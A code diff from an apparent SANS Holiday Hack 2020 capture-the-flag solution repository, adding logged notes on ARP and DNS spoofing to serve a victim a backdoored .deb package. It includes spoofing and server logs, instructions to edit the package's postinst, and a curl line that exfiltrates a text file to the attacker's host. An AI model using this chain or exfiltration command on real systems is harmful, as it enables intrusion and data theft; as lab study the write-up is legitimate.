@@ -729,6 +729,7 @@ namespace Janda.CTF.SANS.HolidayHack
                 mkdir tmp
                 dpkg-deb -R original.deb tmp
                 # edit DEBIAN/postinst
+
                 dpkg-deb -b tmp fixed.deb
 
 
@@ -749,10 +750,131 @@ namespace Janda.CTF.SANS.HolidayHack
 
 
                     https://blog.anvileight.com/posts/simple-python-http-server/
-
-
                     https://stackabuse.com/serving-files-with-pythons-simplehttpserver-module/
             ".Blog(_logger, "Create simple python HTTP server... ");
+
+
+
+            @"
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=15775 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=15775
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57281 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57281
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=13659 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=13659
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=21458 UDP.dport=domain                                  
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=21458
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=12950 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=12950
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:04 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=5401 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:04 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:04 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=5401
+                ^Cguest@10bd7aa40918:~$                                                                                                                     │
+                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+                /pub/jfrost/backdoor/suriv_amd64.deb
+                10.6.6.35 - - [30/Dec/2020 21:06:05] code 404, message File not found
+                10.6.6.35 - - [30/Dec/2020 21:06:05] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 404 -
+                guest@10bd7aa40918:~/debs$ nano w.py 
+                guest@10bd7aa40918:~/debs$ ./w.py 
+                127.0.0.1 - - [30/Dec/2020 21:10:45] ""GET / HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:14] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:15] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:16] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:17] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:18] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:19] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:20] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:22] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 21:11:23] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+            ".Blog(_logger, "Use {script} to send mr JF a nice surprice... ", "web_01.py");
+
+
+
+            @"
+                let's add this to deb package so the host will send us the text
+
+                curl 10.6.0.3:80 --data-binary '@/NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt'
+
+            ".Blog(_logger, "Once I figure out what is wrong with DNS. It stopped working :(");
+
+
+            @"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=14641 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=14641
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=57018 UDP.dport=domain
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=57018
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=11997 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=11997
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=28779 UDP.dport=domain
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=28779
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=20591 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=20591
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=1115 UDP.dport=domain
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=1115
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=25292 UDP.dport=domain
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=25292
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │guest@7359217127bd:~$ ./d.py 
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │<- Ether.src=4c:24:57:ab:ed:84 Ether.dst=02:42:0a:06:00:03 IP.src=10.6.6.35 IP.dst=10.6.6.53 UDP.sport=62959 UDP.dport=domain
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │=> Ether.src=02:42:0a:06:00:03 Ether.dst=4c:24:57:ab:ed:84 IP.src=10.6.6.53 IP.dst=10.6.6.35 UDP.sport=domain UDP.dport=62959
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │guest@7359217127bd:~$ ./d.py 
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
+                <- op=who-has hwsrc=4c:24:57:ab:ed:84 psrc=10.6.6.35 pdst=10.6.6.53 hwdst=00:00:00:00:00:00                                                 │
+                => op=is-at hwsrc=02:42:0a:06:00:03 psrc=10.6.6.53 pdst=10.6.6.35 hwdst=4c:24:57:ab:ed:84                                                   │
+                                                                                                                                                            │
+                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+                  138 32.347994655 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  139 32.364439143    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  140 33.363977127 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  141 33.387950848 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  142 33.404427518    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  143 34.403985552 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  144 34.427945401 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  145 34.444458999    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  146 35.448045967 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  147 35.479992572 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  148 35.504382190    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  149 36.504138075 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  150 36.536124703 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  151 36.568773276    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  152 37.563968557 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  153 37.587932354 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  154 37.604424619    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                  155 38.611986196 4c:24:57:ab:ed:84 → ff:ff:ff:ff:ff:ff ARP 42 Who has 10.6.6.53? Tell 10.6.6.35
+                  156 38.636061736 02:42:0a:06:00:03 → 4c:24:57:ab:ed:84 ARP 42 10.6.6.53 is at 02:42:0a:06:00:03
+                  157 38.660322843    10.6.6.35 → 10.6.6.53    DNS 74 Standard query 0x0000 A ftp.osuosl.org
+                157 packets captured
+                guest@7359217127bd:~$ nano w.py
+                guest@7359217127bd:~$ chmod +x w.py 
+                guest@7359217127bd:~$ ./w.py 
+                10.6.6.35 - - [30/Dec/2020 23:08:07] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 23:08:16] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+                10.6.6.35 - - [30/Dec/2020 23:08:22] ""GET /pub/jfrost/backdoor/suriv_amd64.deb HTTP/1.1"" 200 -
+
+            ".Blog(_logger, "It is important to send only one DNS reply. This will trigger HTTP GET request where we will give back the surprice deb.");
         }
     }
 }
